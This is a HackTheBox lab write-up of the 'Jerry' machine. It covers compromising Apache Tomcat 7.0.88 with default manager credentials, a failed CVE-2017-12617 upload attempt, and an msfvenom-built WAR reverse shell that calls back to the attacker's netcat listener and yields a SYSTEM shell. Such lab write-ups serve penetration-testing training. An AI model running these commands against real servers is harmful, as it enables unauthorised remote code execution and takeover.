---
title: HTB | Jerry
author: Zeropio
date: 2022-12-23
categories: [Pentesting, HackTheBox]
tags: [htb, windows, easy, machines]
permalink: /pentesting/htb/machines/jerry
---

![HTB Img](/assets/img/hackthebox/card/Jerry.png)

# Fingerprint

## Scan
The scan only show us:
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
```


## Enumeration
The default page can be seen in the port 8080:

![][/assets/img/hackthebox/labs/jerry/Pasted image 20221223203436.png]

Every administrator page ask for credentials. Finally, the credentails `admin:admin` will work, but this will not grant access to the **Host Manager** panel. But we can see there a reference to some possible credentials:

```xml
<role rolename="admin-gui"/>
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```

With these credentials we can now enter in the **Manager App**.

---

# Footprint
## Initial Access
For this version we can search for the CVE-2017-12617, without success manually...:

```jsp
<% out.write("<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write  executed.</h3></body></html>"); %>
```

```console
$ curl -X PUT http://10.10.10.95:8080/test.jsp/ -d @- < test.jsp
$ curl http://10.10.10.95:8080/test.jsp                     
<html><head><title>Apache Tomcat/7.0.88 - Error report</title>
```

...or automatized:
```console
$ python3 42966.py -u http://10.10.10.95:8080/

Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 
```

But we can try an upload attack of a WAR file. This is a basic Tomcat attack. First we create the shell:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=80 -f war > shell.war
```
Start a netcat and upload the file. Now we have a new entry:

![][/assets/img/hackthebox/labs/jerry/Pasted image 20221223234606.png]

Loading the web in the `/shell`{: .filepath} path will start the reverse shell.
```console
$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

We are currently Administrator, so there aren't privilege escalation.
